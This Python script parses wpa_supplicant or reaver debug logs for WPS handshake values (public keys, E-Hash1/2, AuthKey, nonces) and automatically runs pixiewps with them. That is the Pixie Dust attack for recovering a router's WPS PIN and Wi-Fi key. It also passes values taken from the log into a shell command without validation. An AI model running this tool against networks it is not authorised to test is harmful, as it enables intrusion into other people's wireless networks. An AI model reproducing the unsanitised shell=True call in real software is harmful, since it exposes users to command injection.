#!/usr/bin/env python

# this is a filter meant to be used with a logfile containing
# debug output from wpa_supplicant or reaver, which extracts
# cryptographic values of interest and tries to run pixiewps
# with them. input is passed on stdin.

import sys, os

class Data():
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''
        self.e_snonce1 = ''
        self.e_snonce2 = ''
        self.wpa_psk = ''

    def __repr__(self):
        return (
            "pke = {}\n"
            "pkr = {}\n"
            "e_hash1 = {}\n"
            "e_hash2 = {}\n"
            "authkey = {}\n"
            "e_nonce = {}\n"
            "e_snonce1 = {}\n"
            "e_snonce2 = {}\n"
            "wpa_psk = {}\n".format(
                self.pke, self.pkr, self.e_hash1, self.e_hash2,
                self.authkey, self.e_nonce, self.e_snonce1,
                self.e_snonce2, self.wpa_psk
            )
        )

def process_wpa_supplicant_line(data, line):
    def get_hex(line):
        return line.split(':', 3)[2].replace(' ', '')

    if line.startswith('WPS: '):
        if 'Enrollee Nonce' in line and 'hexdump' in line:
            data.e_nonce = get_hex(line)
        elif 'DH own Public Key' in line and 'hexdump' in line:
            data.pkr = get_hex(line)
        elif 'DH peer Public Key' in line and 'hexdump' in line:
            data.pke = get_hex(line)
        elif 'AuthKey' in line and 'hexdump' in line:
            data.authkey = get_hex(line)
        elif 'E-Hash1' in line and 'hexdump' in line:
            data.e_hash1 = get_hex(line)
        elif 'E-Hash2' in line and 'hexdump' in line:
            data.e_hash2 = get_hex(line)
        elif 'Network Key' in line and 'hexdump' in line:
            data.wpa_psk = bytes.fromhex(get_hex(line))
        elif 'E-SNonce1' in line and 'hexdump' in line:
            data.e_snonce1 = get_hex(line)
        elif 'E-SNonce2' in line and 'hexdump' in line:
            data.e_snonce2 = get_hex(line)

def got_all_pixie_data(data):
    return all(getattr(data, attr) for attr in ['pke', 'pkr', 'e_nonce', 'authkey', 'e_hash1', 'e_hash2'])

def get_pixie_cmd(data):
    return (
        "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} "
        "--authkey {} --e-nonce {}".format(
            data.pke, data.pkr, data.e_hash1, data.e_hash2,
            data.authkey, data.e_nonce
        )
    )

if __name__ == '__main__':
    data = Data()
    input_data = sys.stdin.read().splitlines()

    for line in input_data:
        process_wpa_supplicant_line(data, line)

    print(data)

    if got_all_pixie_data(data):
        pixiecmd = get_pixie_cmd(data)
        print("running", pixiecmd)
        import subprocess
        subprocess.run(pixiecmd, shell=True)

